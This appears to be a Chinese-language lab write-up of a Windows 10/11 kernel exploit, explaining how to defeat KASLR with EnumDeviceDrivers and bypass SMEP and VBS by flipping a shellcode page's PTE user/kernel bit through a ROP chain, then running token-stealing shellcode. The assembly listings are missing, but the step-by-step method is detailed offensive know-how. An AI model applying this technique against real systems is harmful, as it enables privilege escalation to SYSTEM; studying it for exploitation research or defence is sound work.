绕过Windows10/11的保护机制（KASLR，SMEP，VBS）

由于有SMEP的存在，最初的想法是修改CR4寄存器的第20位（SMEP通过这个位来启用），可以通过构造ROP链实现，但是由于有VBS的存在（即 “对 CR4 控制寄存器位域（包括 SMEP 字段）的未经授权的修改都会被立即阻止”）所以该用翻转shellcode所在内存页对应的页表条目（PTE），使得该页面被标记为内核页，这样再执行shellcode就可以绕过SMEP，也不会遇到VBS

最终解决：
1.构造ROP链翻转页表条目 (PTE) 中与我们的用户模式 shellcode 的内存位置相对应的一个位，U->K,即由用户态页面转为内核态页面（绕过SMEP）

2.x64的token stealing 的shellcode

3.返回Userland的shellcode

首先直接在windows10上运行oob的demo，即传入3000个‘A’可以成功覆盖返回地址为0x41414141

但是运行windows7中的exp时，发生错误

原因是windows10中有SMEP保护机制

错误尝试——修改CR4寄存器的第20位：

为了绕过这个防护机制，首先想到的是修改CR4寄存器的第20位（这个位控制SMEP保护机制是否开启），但是由于不能直接在用户模式内存下执行对应的修改代码，所以需要在内核nt模块中，通过构造ROP链的方式实现该功能，通过调研，发现了一个可以被用来构造ROP的函数：即nt!KeFlushCurrentTbImmediately

通过上图中的调试信息可知，指令mov CR4 rcx相对于nt模块的偏移量为3a0db7

1.获取nt模块的起始地址（绕过KASLR）：

接下来由于有KASLR保护措施的存在，所以nt模块加载的地址不确定，所以需要先得到nt模块的起始地址

最后，我使用了一种已知的方法，即利用 EnumDeviceDrivers 获取基址。

1.函数EnumDeviceDrivers

2.参数说明

参数 类型 说明
lpImageBase LPVOID* 输出缓冲区，存储驱动基址（每个元素是一个 LPVOID，指向驱动基址）。
cb DWORD 缓冲区大小（字节）。
lpcbNeeded LPDWORD 返回实际需要的字节数（如果缓冲区太小，会返回所需大小）。

3.返回值

  • 成功：返回 非零值。
  • 失败：返回 0，可通过 GetLastError() 获取错误代码。

4.函数功能

  • 枚举所有已加载的内核驱动（包括 ntoskrnl.exe、win32k.sys 等）。
  • 返回每个驱动的基址（加载地址），存储在 lpImageBase 数组中。
  • **第一个基址（lpImageBase[0]）是 ntoskrnl.exe**（Windows 内核主模块），因为内核总是最先加载。

不过通过该方法也会遇到一种新内存保护。我们遇到了基于虚拟化的安全（VBS），这意味着 “任何对 CR4 控制寄存器位域（包括 SMEP 字段）的未经授权的修改都会被立即阻止”。所以上述方法行不通，得换路

新的方式绕过SMEP：

在对其他人的做法进行了一番研究后，我们的想法是翻转页表条目 (PTE) 中与我们的用户模式 shellcode 的内存位置相对应的一个位。

基本上，SMEP 是通过 U/S PTE 控制位按内存执行的。让我们看看 WinDbg 中有关用户模式 shellcode 分配的 !pte 输出，以尝试理解页表入口权限。

2.用ROP链实现修改shellcode所在页的权限信息（绕过SMEP和VBS）：

这段ROP链的目的是修改页表条目(PTE)的权限位，将用户空间的内存页标记为内核空间页，从而绕过内存保护机制。下面逐步解释每个部分的作用：

1. 初始化RDX寄存器

asm

这部分通过ROP gadget将RDX寄存器设置为0x08，这个值后面会用于地址计算。

2. 获取PTE地址

asm

这部分:

  1. 首先将shellcode的地址放入RCX寄存器
  2. 然后调用MiGetPteAddress内核函数，该函数接收一个虚拟地址(在RCX中)，返回对应的PTE地址到RAX

3. 修改PTE权限位

asm

这部分是核心操作:

  1. 首先将RAX(PTE地址)减去RDX(0x08)，得到PTE结构中的特定字段地址
  2. 将调整后的地址存入RBX
  3. 重新设置RDX为0x04，这个值用于XOR操作
  4. 执行xor [rbx+0x08], edx，这会翻转PTE中的第二位(用户/内核位)

通过这种操作，攻击者将用户空间的shellcode页面标记为内核页面，从而绕过用户空间代码不能在内核模式执行的安全限制。

3.shellcode解析：

这段 shellcode 由两部分组成：

  1. Token Stealing（令牌窃取） - 提权到 SYSTEM 权限
  2. Kernel to User Return（内核返用户态） - 安全返回用户模式

1.对于Token Stealing（令牌窃取），整体思路同windows7中的oob中的思路，不同的是偏移量

2.对于Kernel to User Return（内核返用户态）。通常情况下，最好是手动恢复执行流程。不过，我决定使用 Kristal-G 的 SYSRET shellcode，这是一种允许从内核返回的通用技术。据我所知，这是首个此类技术（Linux 变种除外）。可以使用 Sickle 生成 Kristal-G 的 shellcode，如下所示：

EXP的流程：

1.GetKernelBaseAddress函数获取nt模块的首地址（绕过KASLR）。因为构造ROP链需要nt模块的基地址

2.用在buffer中构造ROP链实现修改shellcode所在页的页表权限（绕过SMEP和VBS）（修改返回地址为ROP链的基地址）

3.写x64对应的token stealing功能的shellcode的地址写在跟在ROP链后面（注：此处连续写了0xc个shellcode地址，通过连续写入多个shellcode地址，增加了”命中”正确返回位置的概率，即使栈帧计算有少量偏差，只要跳转到这些地址中的任何一个都能执行shellcode）
